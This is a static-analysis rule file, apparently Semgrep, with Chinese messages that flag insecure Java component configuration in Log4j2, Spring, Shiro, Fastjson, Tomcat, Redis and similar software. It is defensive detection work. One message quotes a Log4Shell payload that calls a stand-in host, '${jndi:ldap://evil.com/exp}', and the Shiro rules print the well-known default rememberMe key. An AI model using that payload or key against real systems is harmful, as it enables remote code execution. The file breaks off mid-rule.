rules:
  # ============================================
  # P0 - 组件配置安全 - Log4j2
  # ============================================
  
  - id: java-config-log4j2-jndi-lookup
    patterns:
      - pattern-regex: '\$\{jndi:'
    paths:
      include:
        - "*.xml"
        - "*.properties"
        - "*.yml"
        - "*.yaml"
        - "*.java"
    message: "检测到 Log4j2 JNDI lookup 表达式。CVE-2021-44228 (Log4Shell)：攻击者可通过 ${jndi:ldap://evil.com/exp} 触发远程代码执行。建议升级 Log4j2 到 2.17.1+ 或设置 formatMsgNoLookups=true"
    severity: ERROR
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-502"
      references:
        - https://logging.apache.org/log4j/2.x/security.html

  - id: java-config-log4j2-message-lookup
    patterns:
      - pattern-regex: '\$\{[a-z]+:'
    paths:
      include:
        - "*.xml"
        - "*.properties"
        - "*.java"
    message: "检测到 Log4j2 lookup 表达式。Log4j2 支持 ${ctx:}, ${env:}, ${sys:} 等 lookup，可能导致信息泄露或 RCE。建议升级到 2.17.1+ 或禁用 lookup。"
    severity: WARNING
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-config-log4j2-version-vulnerable
    patterns:
      - pattern-regex: 'log4j[^>]*<version>\s*2\.(0|1[0-4])\.|log4j-version>\s*2\.(0|1[0-4])\.'
    paths:
      include:
        - "pom.xml"
        - "*.gradle"
    message: "检测到 Log4j2 受影响版本 (< 2.15.0)。CVE-2021-44228 (Log4Shell)：远程代码执行漏洞。建议升级到 2.17.1+。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-502"

  # ============================================
  # P1 - 组件配置安全 - Spring Security
  # ============================================
  
  - id: java-config-springsecurity-antMatchers-bypass
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*(permitAll|authenticated|hasRole)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security antMatchers 配置。antMatchers(\"/test\") 可被 /test/ (带斜杠) 绕过，因 Spring WebMVC 的 useTrailingSlashMatch 默认为 true。建议使用 mvcMatchers 或配置 useTrailingSlashMatch=false。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-287"

  - id: java-config-springsecurity-csrf-disabled
    patterns:
      - pattern-regex: 'csrf\s*\(\s*\)\s*\.\s*disable|csrf\(\)\.disable\(\)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security CSRF 保护已禁用。CSRF 保护可防止跨站请求伪造攻击。建议仅对无状态 API 禁用 CSRF。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-352"

  - id: java-config-springsecurity-permitAll-abuse
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"[^"]+"\s*\)\s*\.\s*permitAll|requestMatchers\s*\([^)]+\)\s*\.\s*permitAll'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security permitAll 配置。permitAll 允许匿名访问，请确认是否为公开资源。敏感接口应使用 authenticated() 或 hasRole()。"
    severity: INFO
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-284"

  - id: java-config-springsecurity-doublestar-bypass
    patterns:
      - pattern-regex: 'antMatchers\s*\(\s*"\*\*"\s*\)|requestMatchers\s*\(\s*"\*\*"\s*\)'
    paths:
      include:
        - "*.java"
    message: "检测到 Spring Security 使用 ** 通配符。CVE-2023-34034：双星号匹配可能导致认证绕过。建议使用 /** 或更精确的路径匹配。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-287"
      references:
        - https://spring.io/security/cve-2023-34034

  - id: java-config-springsecurity-frame-options-disabled
    patterns:
      - pattern-regex: 'headers\s*\(\s*\)\s*\.\s*frameOptions\s*\(\s*\)\s*\.\s*disable'
    paths:
      include:
        - "*.java"
    message: "检测到 X-Frame-Options 已禁用。禁用后页面可被 iframe 嵌入，可能导致点击劫持攻击。建议保持默认 DENY 或 SAMEORIGIN。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-1021"

  - id: java-config-springsecurity-session-fixation
    patterns:
      - pattern-regex: 'sessionFixation\s*\(\s*\)\s*\.\s*none'
    paths:
      include:
        - "*.java"
    message: "检测到 Session 固定防护已禁用。攻击者可利用 Session 固定攻击劫持用户会话。建议使用 sessionFixation().migrateSession() 或 newSession()。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-384"

  # ============================================
  # P1 - 组件配置安全 - Spring Boot
  # ============================================
  
  - id: java-config-actuator-expose-all
    patterns:
      - pattern-regex: 'management\.endpoints\.web\.exposure\.include\s*[=:]\s*\*|exposure\.include\s*[=:]\s*\*'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring Boot Actuator 暴露所有端点。默认端点包括：heapdump(内存dump)、env(环境变量)、configprops(配置)、mappings(路由) 等敏感信息。建议仅暴露必要端点：management.endpoints.web.exposure.include=health,info"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"
      references:
        - https://docs.spring.io/spring-boot/reference/actuator/index.html

  - id: java-config-actuator-unrestricted
    patterns:
      - pattern-regex: 'management\.endpoint\.[a-z]+\.access\s*[=:]\s*unrestricted'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Actuator 端点设置为 unrestricted。除 shutdown/heapdump 外，其他端点默认 unrestricted。建议使用 management.endpoints.access.default=none 控制全局权限。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-devtools-enabled
    patterns:
      - pattern-regex: 'spring\.devtools\.(restart|livereload)\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring DevTools 开启。生产环境应禁用 DevTools，可能导致远程代码执行。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-management-port-same
    patterns:
      - pattern-regex: 'management\.server\.port\s*[=:]\s*\$\{server\.port\}|management\.server\.port\s*[=:]\s*8080'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到管理端口与应用端口相同。建议使用独立端口：management.server.port=8081，并配置防火墙限制访问。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-banner-enabled
    patterns:
      - pattern-regex: 'spring\.main\.banner-mode\s*[=:]\s*(console|log)'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Spring Banner 开启。生产环境应禁用 Banner，可能泄露 Spring 版本信息。建议设置 spring.main.banner-mode=off。"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-200"

  # ============================================
  # P0 - 组件配置安全 - Shiro
  # ============================================
  
  - id: java-config-shiro-default-key
    patterns:
      - pattern-regex: 'shiro\.(rememberMe|cookie)\.cipherKey|cipherKey\s*[=:]\s*kPH\+bIxk5D2deZiIxcaaaA=='
    paths:
      include:
        - "*.xml"
        - "*.yml"
        - "*.yaml"
        - "*.properties"
        - "*.java"
    message: "检测到 Shiro 默认密钥或硬编码密钥。CVE-2016-4437：攻击者可通过 rememberMe Cookie 执行任意代码。建议升级到 Shiro 1.7.0+ 并生成自定义密钥。"
    severity: ERROR
    languages: [generic, java]
    metadata:
      category: security
      cwe: "CWE-798"
      references:
        - https://issues.apache.org/jira/browse/SHIRO-550

  - id: java-config-shiro-ini-rememberme
    patterns:
      - pattern-regex: 'rememberMe\s*=\s*true|securityManager\.rememberMeManager'
    paths:
      include:
        - "*.ini"
    message: "检测到 Shiro rememberMe 配置。请确保使用自定义密钥而非默认密钥。默认密钥：kPH+bIxk5D2deZiIxcaaaA=="
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-798"

  - id: java-config-shiro-url-permission-bypass
    patterns:
      - pattern-regex: '/\*\*\s*=\s*anon|/\*\*\s*=\s*authc'
    paths:
      include:
        - "*.ini"
    message: "检测到 Shiro URL 配置使用 /** 匹配。可能导致权限绕过，建议使用精确路径匹配。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-287"

  # ============================================
  # P1 - 组件配置安全 - Swagger/Knife4j
  # ============================================
  
  - id: java-config-swagger-enabled
    patterns:
      - pattern-regex: 'springfox\.documentation\.swagger\.v2\.enabled\s*[=:]\s*true|spring\.mvc\.swagger\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Swagger 开启。生产环境应禁用 Swagger，避免暴露 API 接口文档。建议设置 enabled=false 或通过 profile 区分环境。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-knife4j-enabled
    patterns:
      - pattern-regex: 'knife4j\.(enable|enabled)\s*[=:]\s*true|swagger\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Knife4j/Swagger 开启。生产环境应禁用，/doc.html 可能未授权访问，暴露所有 API 接口。建议设置 knife4j.enable=false。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-swagger-no-auth
    patterns:
      - pattern-regex: '@EnableSwagger2|@EnableOpenApi|Docket\.apiInfo'
    paths:
      include:
        - "*.java"
    message: "检测到 Swagger 配置。请确保生产环境禁用或配置访问认证。Spring Security 需放行 /swagger-resources/**, /v2/api-docs, /doc.html。"
    severity: INFO
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-489"

  # ============================================
  # P1 - 组件配置安全 - Druid
  # ============================================
  
  - id: java-config-druid-stat-expose
    patterns:
      - pattern-regex: 'druid\.stat-view-servlet\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Druid 监控页面开启。/druid/index.html 可能未授权访问，泄露 SQL 执行记录、数据源配置等敏感信息。建议配置 IP 白名单或禁用。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  - id: java-config-druid-no-auth
    patterns:
      - pattern-regex: 'druid\.stat-view-servlet\.enabled\s*[=:]\s*true'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Druid 监控开启但无认证配置。建议添加：druid.stat-view-servlet.login-username 和 druid.stat-view-servlet.login-password"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  - id: java-config-druid-wall-filter-missing
    patterns:
      - pattern-regex: 'druid\.filters\s*[=:]\s*[^w]|druid\.filters\s*[=:]\s*$|spring\.datasource\.druid\.filters\s*[=:]\s*[^w]'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Druid 未配置 wall 防火墙过滤器。wall 过滤器可防止 SQL 注入。建议添加：druid.filters=wall,stat"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-89"

  # ============================================
  # P1 - 组件配置安全 - Fastjson
  # ============================================
  
  - id: java-config-fastjson-autotype-enabled
    patterns:
      - pattern-regex: 'SerializerFeature\.WriteClassName|ParserConfig\.getGlobalInstance\(\)\.setAutoTypeSupport\(true\)'
    paths:
      include:
        - "*.java"
    message: "检测到 Fastjson AutoType 开启。存在反序列化 RCE 风险。建议使用 safeMode：ParserConfig.getGlobalInstance().setSafeMode(true)"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-config-fastjson-version-vulnerable
    patterns:
      - pattern-regex: 'fastjson[^>]*<version>\s*1\.2\.(1[0-9]|2[0-9]|3[0-9]|4[0-9]|5[0-9]|6[0-9]|7[0-9]|80|81|82)\.'
    paths:
      include:
        - "pom.xml"
    message: "检测到 Fastjson 受影响版本 (< 1.2.83)。存在多个反序列化 RCE 漏洞。建议升级到 1.2.83+ 或 2.x 版本。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-502"

  # ============================================
  # P1 - 组件配置安全 - Jackson
  # ============================================
  
  - id: java-config-jackson-defaultTyping
    patterns:
      - pattern-regex: 'enableDefaultTyping|activateDefaultTyping'
    paths:
      include:
        - "*.java"
    message: "检测到 Jackson DefaultTyping 开启。可能导致反序列化 RCE。建议使用白名单：activateDefaultTyping(PolymorphicTypeValidator)"
    severity: ERROR
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  - id: java-config-jackson-polymorphic
    patterns:
      - pattern-regex: '@JsonTypeInfo\(use\s*=\s*JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)'
    paths:
      include:
        - "*.java"
    message: "检测到 Jackson 多态类型使用 CLASS 或 MINIMAL_CLASS。可能导致反序列化漏洞。建议使用 NAME 方式并配置白名单。"
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      cwe: "CWE-502"

  # ============================================
  # P1 - 组件配置安全 - Nacos
  # ============================================
  
  - id: java-config-nacos-auth-disabled
    patterns:
      - pattern-regex: 'nacos\.config\.(server-addr|namespace)|spring\.cloud\.nacos\.config\.server-addr'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Nacos 配置。默认 Nacos 未启用认证，可能导致未授权访问配置中心。建议启用 nacos.core.auth.enabled=true"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  - id: java-config-nacos-discovery-no-auth
    patterns:
      - pattern-regex: 'spring\.cloud\.nacos\.discovery\.server-addr'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Nacos Discovery 配置。服务发现可能暴露服务信息，建议配置访问认证。"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  # ============================================
  # P1 - 组件配置安全 - Sentinel
  # ============================================
  
  - id: java-config-sentinel-dashboard
    patterns:
      - pattern-regex: 'spring\.cloud\.sentinel\.transport\.dashboard'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Sentinel Dashboard 配置。Dashboard 默认无认证，建议配置访问认证或限制内网访问。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  # ============================================
  # P1 - 组件配置安全 - Dubbo
  # ============================================
  
  - id: java-config-dubbo-registry-unauth
    patterns:
      - pattern-regex: 'dubbo\.registry\.address|dubbo\.registry\.(address|protocol)'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
        - "*.xml"
    message: "检测到 Dubbo Registry 配置。注册中心（Zookeeper/Nacos）可能未授权访问，建议配置 ACL 认证。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  - id: java-config-dubbo-port-expose
    patterns:
      - pattern-regex: 'dubbo\.protocol\.port\s*[=:]\s*[0-9]+'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Dubbo 端口配置。Dubbo 服务端口暴露可能被恶意调用，建议配置防火墙或 Token 认证。"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-489"

  # ============================================
  # P1 - 组件配置安全 - Tomcat
  # ============================================
  
  - id: java-config-tomcat-manager-default
    patterns:
      - pattern-regex: 'tomcat-users\.xml|<user username="tomcat"'
    paths:
      include:
        - "*.xml"
    message: "检测到 Tomcat Manager 配置。默认用户名密码 tomcat/tomcat 应修改，否则可能导致 RCE。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-798"

  - id: java-config-tomcat-ajp-enabled
    patterns:
      - pattern-regex: '<Connector\s+protocol="AJP/1\.3"'
    paths:
      include:
        - "server.xml"
    message: "检测到 Tomcat AJP Connector 开启。CVE-2020-1938 (Ghostcat)：AJP 协议可能导致文件读取/包含。建议禁用或配置 secretRequired。"
    severity: ERROR
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-22"

  - id: java-config-tomcat-dir-listing
    patterns:
      - pattern-regex: 'listings\s*=\s*true|directory\s+listings'
    paths:
      include:
        - "web.xml"
    message: "检测到 Tomcat 目录列表开启。可能泄露敏感文件列表，建议设置 listings=false。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-538"

  # ============================================
  # P2 - 组件配置安全 - 数据库连接池
  # ============================================
  
  - id: java-config-hikari-password-plaintext
    patterns:
      - pattern-regex: '(spring\.datasource\.(password|hikari\.password))\s*[=:]\s*[^$\{][^ ]+'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到数据库密码明文配置。建议使用环境变量：password: ${DB_PASSWORD} 或 Jasypt 加密。"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-798"

  - id: java-config-jdbc-url-plaintext
    patterns:
      - pattern-regex: '(spring\.datasource\.(url|jdbc-url))\s*[=:]\s*(jdbc:mysql|jdbc:postgresql|jdbc:oracle)[^$\{]'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到数据库连接信息明文配置。建议使用环境变量或加密存储敏感信息。"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-798"

  # ============================================
  # P2 - 组件配置安全 - Redis
  # ============================================
  
  - id: java-config-redis-password-missing
    patterns:
      - pattern-regex: 'spring\.redis\.(host|cluster\.nodes)'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Redis 配置但无密码。建议启用认证：spring.redis.password=${REDIS_PASSWORD}"
    severity: WARNING
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-306"

  - id: java-config-lettuce-pool-missing
    patterns:
      - pattern-regex: 'spring\.redis\.host'
    paths:
      include:
        - "*.yml"
        - "*.yaml"
        - "*.properties"
    message: "检测到 Redis 配置。建议配置连接池以防止连接泄露：spring.redis.lettuce.pool.max-active=8"
    severity: INFO
    languages: [generic]
    metadata:
      category: security
      cwe: "CWE-400"

  # ============================================
  # P2 - 组件配置安全 - Elasticsearch
  # ============================================
  
  - id: java-config-es-password-plaintext
    patterns:
